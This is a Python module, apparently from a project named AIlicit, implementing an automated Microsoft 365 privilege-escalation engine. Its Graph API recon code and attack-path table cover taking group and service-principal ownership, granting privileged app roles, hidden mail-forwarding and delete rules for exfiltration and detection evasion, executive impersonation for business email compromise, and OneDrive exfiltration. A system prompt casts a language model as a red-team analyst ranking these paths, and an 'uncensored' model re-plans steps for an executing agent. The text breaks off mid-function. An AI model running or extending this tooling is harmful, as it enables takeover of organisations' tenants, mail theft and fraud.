#!/usr/bin/env python3
"""
privesc.py - M365 Privilege Escalation Engine

Three-layer architecture:
1. Deterministic permission graph (edge table + recon data)
   -> Edge expansion produces all candidate escalation paths (JSON).
2. Foundation-Sec-1.1-8B analyst reasoning layer (OpenAI-compatible / Ollama endpoint).
   Fallback chain: Foundation-Sec-8B -> Groq (gpt-oss-20b) -> deterministic
   score-based selection. The ReAct agent re-plans with Qwen3.5-9B-Uncensored
   (REPLAN_MODEL) when a step fails.
3. Top-3 path ranking with PRIVESC probability percentages, plus execution
   ready "attempt_targets" for the downstream ReAct agent.

Pipeline:
    Recon Data (OAuth scopes + parallel_recon results)
        -> Graph Engine (Edge Expansion, incl. multi-hop chains)
        -> Candidate Paths (JSON, with evidence + enables/dependencies)
        -> Foundation-Sec-8B (Path Selection + Reasoning)
        -> Top 3 Selected Paths with PRIVESC probability (JSON)
        -> attempt_targets (per-step execution plan)
        -> [optional] PrivescAgent ReAct loop (dry-run by default)

Integration with postexp.py:
    from .privesc import run_privesc, run_privesc_agent
    result = run_privesc(token_mgr, recon_data)
    # result["top_3_paths"] == list of 3 RankedPath dicts w/ probability_percent
    # result["attempt_targets"] == execution-ready targets for the agent
    agent_report = run_privesc_agent(token_mgr, result["attempt_targets"])

Project: AIlicit
"""

import os
import sys
import json
import base64
import logging
import re
import threading
from contextlib import contextmanager
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any
from datetime import datetime

import requests

from .constants import (
    SEC_API_KEY, SEC_BASE_URL, SEC_MODEL,
    REPLAN_API_KEY, REPLAN_BASE_URL, REPLAN_MODEL,
    GROQ_API_KEY, GROQ_ENDPOINT, SCOUT_MODEL,
    CLIENT_ID, CLIENT_SECRET,
)

# Backwards-compatible module-level names (legacy QWEN_*).
QWEN_API_KEY = SEC_API_KEY
QWEN_BASE_URL = SEC_BASE_URL
QWEN_MODEL = SEC_MODEL

# ============================================================
# GLOBAL LLM SERIALIZATION (task 6)
# ============================================================
# Foundation-Sec-8B (analyst) and Qwen3.5-9B (replanner/explorer) run
# on the same local Ollama instance. Only one model may run at a time,
# so every LLM request (Ollama or Groq) is funnelled through llm_call(),
# which holds a single process-wide lock.
LLM_LOCK = threading.Lock()


@contextmanager
def llm_call():
    """Serialize every LLM request so only one model runs at a time."""
    with LLM_LOCK:
        yield

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

GRAPH_BASE = "https://graph.microsoft.com/v1.0"


# ============================================================
# DATA CLASSES
# ============================================================

@dataclass
class EscalationEdge:
    """A deterministic escalation path edge."""
    path_id: str
    name: str
    description: str
    required_scopes: List[str]
    prereq_objects: List[str]
    action: str
    gain: str
    confidence: float
    stealth_score: float
    reversibility: bool
    graph_call: str
    preconditions: Dict[str, Any]
    # Ordered concrete steps of this path (default: [action, graph_call]).
    # Downstream ReAct agents execute these one at a time.
    steps: List[str] = field(default_factory=list)
    # Observed objects this edge was derived from (id/name) - grounds the
    # candidate in real recon data so the LLM must not invent objects.
    evidence: Dict[str, Any] = field(default_factory=dict)

    def resolved_steps(self) -> List[str]:
        """Concrete step list (falls back to action + graph_call)."""
        if self.steps:
            return list(self.steps)
        return [s for s in [self.action, self.graph_call] if s]


@dataclass
class ReconData:
    """Reconnaissance data from OAuth scopes + parallel_recon."""
    granted_scopes: List[str]
    user: Dict[str, Any]
    groups: List[Dict[str, Any]]
    applications: List[Dict[str, Any]]
    mail_rules: List[Dict[str, Any]]
    contacts: List[Dict[str, Any]]
    misconfigs: List[Dict[str, Any]]
    privileged_roles: List[Dict[str, Any]] = field(default_factory=list)
    # Per-group detail (owners, role assignments, privilege flag) - enables
    # multi-hop chain hints (take-over group -> become owner -> grant role).
    group_details: List[Dict[str, Any]] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class RankedPath:
    """A ranked attack path with probability."""
    path_id: str
    name: str
    description: str
    steps: List[str]
    probability: float  # 0.0-1.0
    impact: str
    stealth_score: float
    time_estimate: str
    narrative: str
    reasoning: str
    source: str = "deterministic"  # which layer picked it


# ============================================================
# RECON HELPERS
# ============================================================

def _decode_jwt(token: str) -> Dict[str, Any]:
    """Decode (unverified) JWT payload of an access token."""
    try:
        parts = (token or "").split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def scopes_from_token(token: str) -> List[str]:
    """Extract granted OAuth scopes from the access token JWT.

    v1.0 tokens use the 'scope' claim; v2.0 tokens use 'scp'.
    """
    try:
        claims = _decode_jwt(token)
        scope_claim = claims.get("scp") or claims.get("scope") or ""
        return [s.strip() for s in scope_claim.split() if s.strip()]
    except Exception:
        return []


def _extract_json(text: str):
    """Extract a JSON dict from model output. Robust to: clean JSON,
    ```json fences, prose wrapped around JSON, trailing commas, and multiple
    objects in one response (the one containing "top_paths"/"paths"/"action"
    wins, else the largest object)."""
    import re as _re
    text = (text or "").strip()
    if not text:
        return None
    # strip markdown fences
    fence = _re.search(r"```(?:json)?\s*(\{.*?\})\s*```", text, _re.DOTALL)
    if fence:
        text = fence.group(1)
    # direct
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            return obj
    except (json.JSONDecodeError, ValueError):
        pass
    # find all balanced top-level objects
    objs = []
    depth = 0
    start = -1
    for i, ch in enumerate(text):
        if ch == "{":
            if depth == 0:
                start = i
            depth += 1
        elif ch == "}":
            if depth > 0:
                depth -= 1
                if depth == 0 and start >= 0:
                    objs.append(text[start:i + 1])
                    start = -1
    if not objs:
        return None
    def _score(o_str):
        s = 0
        for key in ("top_paths", "paths", "action"):
            if key in o_str:
                s += 1000
        return (s, len(o_str))
    for candidate in sorted(objs, key=_score, reverse=True):
        cleaned = _re.sub(r",\s*([}\]])", r"\1", candidate)  # trailing commas
        for attempt in (candidate, cleaned):
            try:
                obj = json.loads(attempt)
                if isinstance(obj, dict):
                    return obj
            except (json.JSONDecodeError, ValueError):
                continue
    return None


def _values(d: Any) -> List[Dict[str, Any]]:
    """Extract the 'value' list from a Graph API response dict (safe)."""
    if isinstance(d, dict):
        v = d.get("value")
        if isinstance(v, list):
            return [x for x in v if isinstance(x, dict)]
    if isinstance(d, list):
        return [x for x in d if isinstance(x, dict)]
    return []


def _graph_get(token_mgr, endpoint: str, timeout: int = 20) -> Dict[str, Any]:
    """GET a Graph endpoint with a single 401-refresh retry. Never raises."""
    try:
        if token_mgr is None or not token_mgr.ensure_valid_token():
            return {}
        resp = requests.get(
            GRAPH_BASE + endpoint,
            headers=token_mgr.get_headers(),
            timeout=timeout,
        )
        if resp.status_code == 401 and token_mgr.refresh_access_token():
            resp = requests.get(
                GRAPH_BASE + endpoint,
                headers=token_mgr.get_headers(),
                timeout=timeout,
            )
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, dict) else {}
        logger.debug("Graph GET %s -> %s", endpoint, resp.status_code)
    except Exception as e:
        logger.debug("Graph GET %s failed: %s", endpoint, e)
    return {}


def _graph_get_with(token: Optional[str], endpoint: str, timeout: int = 20) -> Dict[str, Any]:
    """GET a Graph endpoint using a raw Bearer token (e.g. app-only). Never raises."""
    if not token:
        return {}
    try:
        resp = requests.get(
            GRAPH_BASE + endpoint,
            headers={"Authorization": f"Bearer {token}"},
            timeout=timeout,
        )
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, dict) else {}
        logger.debug("Graph GET (app token) %s -> %s", endpoint, resp.status_code)
    except Exception as e:
        logger.debug("Graph GET (app token) %s failed: %s", endpoint, e)
    return {}


def _client_credentials_token() -> Optional[str]:
    """Best-effort app-only token via client_credentials (needs CLIENT_SECRET +
    app-level Directory.Read.All / Application.Read.All on the registration).
    Cached for the process lifetime. Returns None on any failure."""
    global _CC_TOKEN_CACHE
    if _CC_TOKEN_CACHE is not None:
        return _CC_TOKEN_CACHE
    if not CLIENT_SECRET:
        _CC_TOKEN_CACHE = ""  # sentinel: configured-absent, don't retry
        return None
    try:
        resp = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "grant_type": "client_credentials",
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "scope": "https://graph.microsoft.com/.default",
            },
            timeout=20,
        )
        if resp.status_code == 200:
            _CC_TOKEN_CACHE = resp.json().get("access_token", "")
            logger.info("[recon] obtained app-only (client_credentials) token")
        else:
            logger.info("[recon] client_credentials failed: HTTP %s %s",
                        resp.status_code, resp.text[:150])
            _CC_TOKEN_CACHE = ""
    except Exception as e:
        logger.debug("[recon] client_credentials error: %s", e)
        _CC_TOKEN_CACHE = ""
    return _CC_TOKEN_CACHE or None


_CC_TOKEN_CACHE: Optional[str] = None  # None = not attempted, "" = failed/absent


def _sp_app_roles(token_mgr, sp_id: Optional[str], cap: int = 40) -> List[Dict[str, Any]]:
    """Best-effort fetch of the app roles exposed by a service principal."""
    if not sp_id:
        return []
    data = _graph_get(token_mgr, f"/servicePrincipals/{sp_id}/appRoles?$top={cap}")
    return _values(data)


def _detect_misconfigs(recon: "ReconData") -> List[Dict[str, Any]]:
    """Deterministic misconfiguration detection over recon data."""
    findings: List[Dict[str, Any]] = []

    for rule in recon.mail_rules:
        # rule shape: {isEnabled, actions: {forwardTo, delete, copyTo}, ...}
        actions = rule.get("actions") or {}
        is_hidden = rule.get("isHidden", False)
        forward_to = actions.get("forwardTo") or []
        for addr in forward_to:
            email = addr.get("emailAddress", {}).get("address", "") if isinstance(addr, dict) else str(addr)
            findings.append({
                "type": "hidden_forwarding" if is_hidden else "forwarding_rule",
                "description": f"Mail rule forwards to {email or 'unknown'}",
                "severity": "high" if is_hidden else "medium",
            })
        if actions.get("delete") and is_hidden:
            findings.append({
                "type": "silent_delete_rule",
                "description": "Hidden rule silently deletes inbound messages",
                "severity": "high",
            })
        if actions.get("copyTo") and is_hidden:
            findings.append({
                "type": "silent_copy_rule",
                "description": "Hidden rule copies inbound messages (shadow mailbox)",
                "severity": "medium",
            })

    for grp in recon.groups:
        name = (grp.get("displayName") or "").lower()
        if any(k in name for k in ("admin", "domain", "exchange", "azure ad")):
            findings.append({
                "type": "privileged_group_membership",
                "description": f"User is member of privileged group: {grp.get('displayName')}",
                "severity": "high",
            })

    for app in recon.applications:
        sp_type = app.get("servicePrincipalType", "Application")
        if sp_type == "Application":
            findings.append({
                "type": "enterprise_application",
                "description": f"Enterprise application present: {app.get('displayName', 'unknown')}",
                "severity": "medium",
            })
        # High-privilege app roles granted to the service principal (e.g. Directory.ReadWrite.All)
        app_roles = app.get("app_roles") or []
        if app_roles:
            for role in app_roles:
                perm = (role.get("value") or "").lower()
                if any(h in perm for h in ("directory.readwrite", "directory.read.all", "user.readwrite", "user.read.all")):
                    findings.append({
                        "type": "privileged_app_role",
                        "description": f"Service principal '{app.get('displayName', 'unknown')}' holds high-privilege app role: {role.get('value')}",
                        "severity": "high",
                        "app_id": app.get("id"),
                    })
                    break
        # User already owns a service principal / app (can edit its roles, secrets, owners)
        if app.get("user_owns"):
            findings.append({
                "type": "user_owned_app",
                "description": f"User already owns service principal: {app.get('displayName', 'unknown')}",
                "severity": "high",
                "app_id": app.get("id"),
            })

    # Direct privileged-role membership (Global Admin, Privileged Role Admin, ...)
    priv_roles = {r.get("displayName") for r in (recon.privileged_roles or []) if isinstance(r, dict)}
    for role in sorted(priv_roles):
        if role:
            findings.append({
                "type": "direct_privileged_role",
                "description": f"User holds direct privileged role: {role}",
                "severity": "high",
                "role": role,
            })

    return findings


# ============================================================
# DETERMINISTIC EDGE EXPANDER (M365 ESCALATION GRAPH)
# ============================================================

class EdgeExpander:
    """Expands all possible M365 escalation edges from recon data."""

    # Deterministic M365 escalation edge table
    EDGE_TABLE: List[Dict[str, Any]] = [
        {
            "id": "edge_group_ownership",
            "name": "Group Ownership Escalation",
            "desc": "Take ownership of a writable group, then join a role-assignment (Privileged Role Admin / Domain Admins) group",
            "scopes": ["Directory.ReadWrite.All"],
            "gain": "Domain Admin",
            "impact": 1.0,
            "confidence": 0.85,
            "stealth": 0.55,
            "reversible": True,
            "time": "5-10 minutes",
            "graph_call": "PUT /groups/{group_id}/owners/$ref/{user_id}",
            "requires_obj": "groups",
        },
        {
            "id": "edge_app_ownership",
            "name": "Application Ownership Escalation",
            "desc": "Take ownership of an enterprise application and re-point its app roles / client secret",
            "scopes": ["Application.ReadWrite.All"],
            "gain": "App Admin",
            "impact": 0.85,
            "confidence": 0.8,
            "stealth": 0.7,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "PUT /servicePrincipals/{sp_id}/owners/$ref/{user_id}",
            "requires_obj": "applications",
        },
        {
            "id": "edge_app_role_grant",
            "name": "Application Role Grant",
            "desc": "Create an app role assignment granting a controllable app a privileged API role (Directory.ReadWrite.All)",
            "scopes": ["Application.ReadWrite.All"],
            "gain": "App Role -> Directory Write",
            "impact": 0.8,
            "confidence": 0.7,
            "stealth": 0.5,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "POST /appRoleAssignments",
            "requires_obj": "applications",
        },
        {
            "id": "edge_privileged_role_abuse",
            "name": "Direct Privileged Role Abuse",
            "desc": "User already holds a privileged role (e.g. Global Admin / Privileged Role Admin) - exercise it directly (assign roles, manage app registrations, read directory)",
            "scopes": ["Directory.Read.All"],
            "gain": "Immediate high-privilege control (role-dependent)",
            "impact": 0.95,
            "confidence": 0.9,
            "stealth": 0.4,
            "reversible": True,
            "time": "2-5 minutes",
            "graph_call": "GET /me/roleAssignments -> POST /administrativeUnits/{id}/roles/{role}/members/$ref/{user}",
            "requires_obj": None,
            "requires_misconfig": True,
        },
        {
            "id": "edge_sp_app_role_abuse",
            "name": "Service Principal High-Privilege App Role",
            "desc": "A service principal already carries a high-privilege app role (Directory.ReadWrite.All / User.ReadWrite.All) - invoke it or copy the grant onto an attacker-controllable principal",
            "scopes": ["Application.Read.All", "User.Read"],
            "gain": "App-role level directory write",
            "impact": 0.85,
            "confidence": 0.75,
            "stealth": 0.55,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "GET /servicePrincipals/{sp_id}/appRoleAssignments",
            "requires_misconfig": True,
            "requires_obj": None,
        },
        {
            "id": "edge_guest_invite",
            "name": "Guest User Invitation",
            "desc": "Invite an external guest user and (via a writable group) promote them to a privileged role",
            "scopes": ["Directory.ReadWrite.All"],
            "gain": "Guest Admin access",
            "impact": 0.7,
            "confidence": 0.65,
            "stealth": 0.45,
            "reversible": True,
            "time": "5-8 minutes",
            "graph_call": "POST /invitations",
            "requires_obj": None,
        },
        {
            "id": "edge_mail_forwarding",
            "name": "Mail Forwarding Rule (Persistence + Exfiltration)",
            "desc": "Create a hidden inbox forwarding rule to an external account for persistence and exfil",
            "scopes": ["Mail.ReadWrite"],
            "gain": "Persistence + Email Exfiltration",
            "impact": 0.6,
            "confidence": 0.9,
            "stealth": 0.4,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "POST /me/mailFolders/inbox/messageRules",
            "requires_obj": None,
        },
        {
            "id": "edge_silent_delete",
            "name": "Hidden Delete/Copy Rule",
            "desc": "Create a hidden rule that silently deletes or copies mail (detection evasion / shadow mailbox)",
            "scopes": ["Mail.ReadWrite"],
            "gain": "Detection Evasion",
            "impact": 0.55,
            "confidence": 0.85,
            "stealth": 0.85,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "POST /me/mailFolders/inbox/messageRules",
            "requires_obj": None,
        },
        {
            "id": "edge_contact_impersonation",
            "name": "External Contact Impersonation",
            "desc": "Create a mail contact matching an internal executive; replies to the victim land in attacker-controlled flow",
            "scopes": ["Contacts.ReadWrite"],
            "gain": "Reply spoof / BEC amplification",
            "impact": 0.55,
            "confidence": 0.6,
            "stealth": 0.65,
            "reversible": True,
            "time": "2-3 minutes",
            "graph_call": "POST /me/contacts",
            "requires_obj": "contacts",
        },
        {
            "id": "edge_calendar_hijack",
            "name": "Calendar / Meeting Hijack",
            "desc": "Read + write the victim's calendar; hijack a scheduled meeting thread to inject BEC messages",
            "scopes": ["Calendars.ReadWrite"],
            "gain": "Context hijack for BEC",
            "impact": 0.45,
            "confidence": 0.75,
            "stealth": 0.6,
            "reversible": True,
            "time": "2-4 minutes",
            "graph_call": "GET /me/calendarView / PUT /me/events/{id}",
            "requires_obj": None,
        },
        {
            "id": "edge_one_drive_exfil",
            "name": "OneDrive File Exfiltration",
            "desc": "Stream tenant files out via Files.ReadWrite.All (data hoarding to amplify later privesc)",
            "scopes": ["Files.ReadWrite.All"],
            "gain": "Bulk Data Access",
            "impact": 0.45,
            "confidence": 0.85,
            "stealth": 0.35,
            "reversible": False,
            "time": "5-15 minutes",
            "graph_call": "GET /me/drive/root:/{path}/content",
            "requires_obj": None,
        },
        {
            "id": "edge_sp_owner_takeover",
            "name": "Service Principal Ownership Takeover",
            "desc": "User already owns a service principal - re-point its app roles / client secret / owners to gain controllable privileged access",
            "scopes": ["Application.ReadWrite.All"],
            "requires_misconfig": True,
            "gain": "Controllable privileged service principal",
            "impact": 0.8,
            "confidence": 0.75,
            "stealth": 0.6,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "PUT /servicePrincipals/{sp_id}/owners/$ref/{user_id}",
            "requires_obj": "applications_owned",
        },
        {
            "id": "edge_verified_domains",
            "name": "Verified Domain Enumeration",
            "desc": "Enumerate org verified domains to surface additional phishable / mergeable tenant domains",
            "scopes": ["Directory.Read.All"],
            "gain": "Tenant Surface Expansion",
            "impact": 0.4,
            "confidence": 0.9,
            "stealth": 0.9,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "GET /organization",
            "requires_obj": None,
        },
    ]

    def __init__(self, recon_data: ReconData):
        self.recon = recon_data
        self.edges: List[EscalationEdge] = []

    # ----------------------------------------------------------
    def expand(self) -> List[EscalationEdge]:
        """Expand all possible edges based on recon data. Deterministic."""
        self.edges = []
        for edge_def in self.EDGE_TABLE:
            # Misconfig-driven edges are gated by observation, not by a specific
            # directory scope - relax the scope check to a base User.Read.
            if edge_def.get("requires_misconfig"):
                if not self._scopes_satisfied(["User.Read"]):
                    continue
            else:
                if not self._scopes_satisfied(edge_def["scopes"]):
                    continue

            # Misconfig-gated edges only emit when the supporting misconfig is observed.
            if edge_def.get("requires_misconfig") and not self._has_relevant_misconfig(edge_def["id"]):
                continue

            obj_key = edge_def.get("requires_obj")
            if obj_key is not None:
                objects = getattr(self.recon, obj_key, []) or []
                if obj_key == "applications_owned":
                    objects = [a for a in self.recon.applications if a.get("user_owns")]
                if not objects:
                    continue

            # Confidence boost from supporting misconfigurations
            boost = self._recon_boost(edge_def)
            confidence = min(0.98, edge_def["confidence"] + boost)

            if obj_key == "groups":
                self._expand_per_object(edge_def, self.recon.groups, "group_id", confidence)
            elif obj_key in ("applications", "applications_owned"):
                self._expand_per_object(edge_def, objects, "sp_id", confidence)
            elif obj_key == "contacts":
                self._expand_generic(edge_def, confidence)  # one path, targets built at exec time
            else:
                self._expand_generic(edge_def, confidence)
        return self.edges

    # ----------------------------------------------------------
    def _scopes_satisfied(self, required: List[str]) -> bool:
        """True if every required scope is granted (base scope counts as grant of its .ReadWrite.All too)."""
        granted = [s for s in self.recon.granted_scopes if s]
        def has(scope: str) -> bool:
            if scope in granted:
                return True
            # .ReadWrite implies .Read
            base, _, variant = scope.rpartition(".")
            if variant == "ReadWrite" and base:
                if f"{base}.ReadWrite.All" in granted:
                    return True
            if variant in ("Read", "ReadWrite") and base:
                # "Directory.Read.All" satisfies a "Directory.Read" requirement
                if f"{base}.{variant}.All" in granted:
                    return True
                if f"{base}.ReadWrite.All" in granted:
                    return True
            return False
        return all(has(s) for s in required)

    def _has_relevant_misconfig(self, edge_id: str) -> bool:
        """True when the observed misconfigs actually support this edge."""
        types = {m.get("type") for m in self.recon.misconfigs}
        if edge_id == "edge_privileged_role_abuse":
            return "direct_privileged_role" in types
        if edge_id == "edge_sp_app_role_abuse":
            return "privileged_app_role" in types
        if edge_id == "edge_sp_owner_takeover":
            return "user_owned_app" in types
        return False

    def _recon_boost(self, edge_def: Dict) -> float:
        """Deterministic confidence boost from observed misconfigs."""
        boost = 0.0
        types = {m.get("type") for m in self.recon.misconfigs}
        if edge_def["id"] == "edge_group_ownership" and "privileged_group_membership" in types:
            boost += 0.08
        if edge_def["id"] in ("edge_mail_forwarding", "edge_silent_delete") and (
            "hidden_forwarding" in types or "forwarding_rule" in types
        ):
            boost += 0.05
        if edge_def["id"] == "edge_app_ownership" and "enterprise_application" in types:
            boost += 0.05
        if edge_def["id"] == "edge_privileged_role_abuse" and "direct_privileged_role" in types:
            boost += 0.05
        if edge_def["id"] == "edge_sp_app_role_abuse" and "privileged_app_role" in types:
            boost += 0.05
        if edge_def["id"] == "edge_sp_owner_takeover" and "user_owned_app" in types:
            boost += 0.05
        if self.recon.granted_scopes and len(self.recon.granted_scopes) >= 5:
            boost += 0.02  # broad token footprint
        return boost

    def _expand_per_object(self, edge_def: Dict, objects: List[Dict], obj_id_key: str, confidence: float):
        for obj in objects:
            obj_id = obj.get("id", "unknown")
            name = obj.get("displayName") or obj.get("mailNickname") or obj.get("appDisplayName") or "unknown"
            if edge_def["id"] == "edge_group_ownership" and (obj.get("is_owner") or not name):
                continue  # already owner or unusable
            if edge_def["id"] == "edge_app_ownership" and obj.get("is_owner"):
                continue
            call = edge_def["graph_call"].replace("{" + obj_id_key + "}", obj_id)
            self.edges.append(EscalationEdge(
                path_id=f"{edge_def['id']}::{obj_id}",
                name=edge_def["name"],
                description=f"{edge_def['desc']} - Target: {name}",
                required_scopes=list(edge_def["scopes"]),
                prereq_objects=[obj_id],
                action=f"Escalate via {name}",
                gain=edge_def["gain"],
                confidence=confidence,
                stealth_score=edge_def["stealth"],
                reversibility=edge_def["reversible"],
                graph_call=call,
                preconditions={obj_id_key: obj_id, "object_name": name},
                steps=self._edge_steps(edge_def, obj_id, name, obj_id_key),
                evidence={obj_id_key: obj_id, "object_name": name},
            ))

    def _edge_steps(self, edge_def: Dict, obj_id: str, name: str,
                    obj_id_key: str = "obj_id") -> List[str]:
        """Concrete ordered step list for a deterministic edge (multi-hop where
        the gain is only realised after a follow-up write)."""
        eid = edge_def["id"]
        if eid == "edge_group_ownership":
            return [
                f"GET /groups/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
                f"PUT /groups/{obj_id}/owners/$ref/{obj_id}  # take ownership of '{name}' (Directory.ReadWrite.All)",
                f"GET /groups/{obj_id}/members?$select=id,displayName,objectType  # find a DirectoryRole / privileged group",
                f"POST /groups/{obj_id}/members  # add self (or invitee) to the privileged group",
                f"GET /me/roleAssignments?$select=roleDefinitionId  # verify the elevated role was granted",
            ]
        if eid == "edge_app_ownership":
            return [
                f"GET /servicePrincipals/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
                f"PUT /servicePrincipals/{obj_id}/owners/$ref/{obj_id}  # take ownership of SP '{name}'",
                f"GET /servicePrincipals/{obj_id}/appRoles?$top=40  # enumerate exposed app roles",
                f"POST /appRoleAssignments  # grant a privileged app role (e.g. Directory.ReadWrite.All) to a controllable principal",
                f"GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify grant",
            ]
        if eid == "edge_sp_owner_takeover":
            return [
                f"GET /servicePrincipals/{obj_id}/owners?$select=id,displayName  # confirm current owner(s)",
                f"PUT /servicePrincipals/{obj_id}/owners/$ref/{obj_id}  # (re)assert ownership of SP '{name}'",
                f"GET /servicePrincipals/{obj_id}/appRoles?$top=40  # enumerate exposed app roles",
                f"POST /appRoleAssignments  # point a high-privilege app role at a controllable principal",
                f"GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify grant",
            ]
        # Generic single-step fallback
        return [edge_def["graph_call"].replace("{" + obj_id_key + "}", obj_id)]

    def _expand_generic(self, edge_def: Dict, confidence: float):
        self.edges.append(EscalationEdge(
            path_id=edge_def["id"],
            name=edge_def["name"],
            description=edge_def["desc"],
            required_scopes=list(edge_def["scopes"]),
            prereq_objects=[],
            action=edge_def["name"],
            gain=edge_def["gain"],
            confidence=confidence,
            stealth_score=edge_def["stealth"],
            reversibility=edge_def["reversible"],
            graph_call=edge_def["graph_call"],
            preconditions={},
            steps=self._generic_steps(edge_def),
        ))

    def _generic_steps(self, edge_def: Dict) -> List[str]:
        eid = edge_def["id"]
        if eid == "edge_sp_app_role_abuse":
            return [
                "GET /servicePrincipals?$top=100&$select=id,displayName,appRoles  # locate SP carrying a high-privilege app role",
                "GET /servicePrincipals/{sp_id}/appRoleAssignments  # see who the role is currently granted to",
                "POST /appRoleAssignments  # copy the grant onto an attacker-controllable principal",
                "GET /appRoleAssignments?$filter=principalId eq '<new>'  # verify",
            ]
        if eid == "edge_privileged_role_abuse":
            return [
                "GET /me/roleAssignments?$select=roleDefinitionId,scope  # confirm the held privileged role",
                "POST /roleManagement/directory/roleAssignments  # assign a higher/equivalent role to self or a new object",
                "GET /me/roleAssignments  # verify the new assignment is live",
            ]
        if eid == "edge_guest_invite":
            return [
                "POST /invitations  # invite an external guest user",
                "PUT /groups/{group_id}/members/$ref/{guest_id}  # add guest to a writable/privileged group",
                "GET /groups/{group_id}/members  # verify membership",
            ]
        # Single-step fallback
        return [edge_def["graph_call"]]

    def build_chains(self) -> List[Dict[str, Any]]:
        """Deterministic multi-hop chains: composite 2-3 edge sequences where one
        edge's gain unlocks the required scope / object of the next. Used to give
        the analyst richer candidate_chains than single edges.

        Returns a list of dicts: {chain_id, edges, description, steps, gain}.
        """
        chains: List[Dict[str, Any]] = []
        if not self.edges:
            return chains
        by_id = {e.path_id: e for e in self.edges}

        # Chain 1: group ownership -> join privileged role group (role inheritance)
        grp = next((e for e in self.edges if e.path_id.startswith("edge_group_ownership::")), None)
        if grp:
            chains.append({
                "chain_id": "chain_group_to_role",
                "edges": [grp.path_id],
                "description": (
                    "Multi-hop: take ownership of a group, then use it to join a privileged "
                    "role group so the role is inherited; verify via /me/roleAssignments."
                ),
                "steps": grp.resolved_steps(),
                "gain": "Domain Admin / PRA (via group role inheritance)",
            })

        # Chain 2: SP ownership -> app-role grant -> directory write
        sp = next((e for e in self.edges if e.path_id.startswith(("edge_sp_owner_takeover::", "edge_app_ownership::"))), None)
        if sp:
            chains.append({
                "chain_id": "chain_sp_to_dirwrite",
                "edges": [sp.path_id],
                "description": (
                    "Multi-hop: take ownership of a service principal, grant a high-privilege "
                    "app role (Directory.ReadWrite.All / User.ReadWrite.All) onto a controllable "
                    "principal, then use that principal to mutate the directory."
                ),
                "steps": sp.resolved_steps(),
                "gain": "Directory.ReadWrite.All / Application.ReadWrite.All (via app role)",
            })

        # Chain 3: guest invite -> privileged group -> role
        guest = next((e for e in self.edges if e.path_id == "edge_guest_invite"), None)
        if guest and any(e.path_id.startswith("edge_group_ownership::") for e in self.edges):
            g = next(e for e in self.edges if e.path_id.startswith("edge_group_ownership::"))
            chains.append({
                "chain_id": "chain_guest_to_role",
                "edges": [guest.path_id, g.path_id],
                "description": (
                    "Multi-hop: invite a guest, add it to a writable privileged group via the "
                    "group-ownership path, and exercise the inherited role from the guest."
                ),
                "steps": guest.resolved_steps() + ["(then continue the group-ownership chain)"],
                "gain": "Guest Admin access + inherited privileged role",
            })

        return chains


# ============================================================
# FOUNDATION-SEC-8B REASONING LAYER
# ============================================================

class SecAnalyst:
    """Path-selection reasoning layer (Foundation-Sec-8B analyst).

    Foundation-Sec-1.1-8B-Instruct is the PRIMARY and always-attempted backend
    (with retries). Groq (GPT-oss-20b) is a secondary fallback; deterministic
    score-based selection is only used as an absolute last resort when
    neither model is reachable or parseable.

    Every model request is funnelled through llm_call() so that this analyst
    and the replanner/explorer never hit Ollama concurrently.
    """

    SYSTEM_PROMPT = (
        "You are a senior Microsoft 365 / Entra ID red-team analyst running on a "
        "specialised Foundation-Sec-8B security model. "
        "You are given deterministic privilege-escalation candidate paths plus recon context. "
        "Select the TOP 3 most probable privilege-escalation paths for THIS tenant, assign each "
        "a probability percentage, and explain your reasoning.\n"
        "You must ground every choice STRICTLY in the OBJECTS OBSERVED IN RECON and the "
        "per-candidate evidence. Do NOT invent object IDs, group names, app names, or roles "
        "that are not present in the recon data. Only return a path whose required scopes are "
        "actually satisfied by the GRANTED SCOPES.\n"
        "Do NOT just pick email/mailbox tricks. Explicitly weigh identity and application "
        "vectors: group ownership, enterprise application / service-principal ownership, "
        "high-privilege app roles (Directory.ReadWrite.All / User.ReadWrite.All), direct "
        "privileged role assignments (Global Admin, Privileged Role Admin), user-owned "
        "service principals, multi-hop chains, and guest invitations. Consider the "
        "candidate_chains (multi-hop) too, not only single edges. Prefer the path with the "
        "highest (probability x impact) that is also stealthy and reversible where possible.\n"
        "<|no_think|>"    )

    MAX_RETRIES = 3

    def __init__(self):
        self.model_url = (SEC_BASE_URL or "").rstrip("/") + "/chat/completions"

    # ----------------------------------------------------------
    def select_paths(self, edges: List[EscalationEdge], recon_data: ReconData) -> List[RankedPath]:
        """Select and rank top 3 escalation paths."""
        if not edges:
            return []

        deterministic = self._fallback_selection(edges)
        deterministic_ids = {p.path_id for p in deterministic}
        deterministic_map = {p.path_id: p for p in deterministic}

        candidates = self._build_candidates(edges, recon_data)
        prompt = self._build_prompt(candidates, recon_data, edges)

        response = self._call_foundationsec(prompt) or self._call_groq(prompt)
        if not response:
            logger.warning(
                "[FoundationSec] model unreachable after retries - using deterministic selection"
            )
            return deterministic

        parsed = self._parse_response(response, edges, recon_data)
        if not parsed:
            logger.warning("[FoundationSec] response unparseable - using deterministic selection")
            return deterministic

        # Keep only paths grounded in the deterministic edge set
        grounded: List[RankedPath] = []
        for p in parsed:
            if p.path_id not in deterministic_ids:
                # try fuzzy match by base id
                base = p.path_id.split("::")[0]
